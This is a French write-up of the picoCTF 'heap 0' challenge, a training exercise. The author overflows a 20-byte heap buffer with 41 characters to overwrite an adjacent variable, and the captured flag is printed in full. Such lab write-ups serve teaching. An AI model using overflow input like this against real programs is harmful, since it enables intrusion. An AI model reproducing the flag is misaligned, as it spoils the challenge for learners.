# heap 0

## Description

Are overflows just a stack concern?
Download the binary here
. Download the source here.
Connect with the challenge instance here:
nc tethys.picoctf.net <port>

## Write-up

flag:

Après avoir téléchargé le fichier source et le binaire,
je lance le binaire. Ca ressemble à un cas assez basique pour lequel
on cherche un seg fault.

```bash
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x62c3409882b0  ->   pico
+-------------+----------------+
[*]   0x62c3409882d0  ->   bico
+-------------+----------------+
```

On nous donne deux adresses et deux données et un menu avec de
choix à faire. Évidemment, le choix 4 pour l'affichage du flag
ne fonctionnera pas au premier coup.

```bash
Enter your choice: 4
Looks like everything is still secure!

No flage for you :(
```

Comme on a deux adresses, on peut se dire qu'en choisissant l'option 2
d'écrire dans le buffer, on peut faire un overflow. (C'est d'ailleurs
ce qui est sous-entendu par le résultat du choix 4).

On voit deux espaces mémoire de 20 octets.
Si on injecte 40 octets + 1 octet, on devrait obtenir un overflow.

```bash
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5c91fc5962b0  ->   pico
+-------------+----------------+
[*]   0x5c91fc5962d0  ->   bico
+-------------+----------------+

1. Print Heap:  (print the current state of the heap)
2. Write to buffer: (write to your own personal block of data on the heap)
3. Print safe_var: (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:  (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:  (print the current state of the heap)
2. Write to buffer: (write to your own personal block of data on the heap)
3. Print safe_var: (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:  (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_0c473fe8}
```
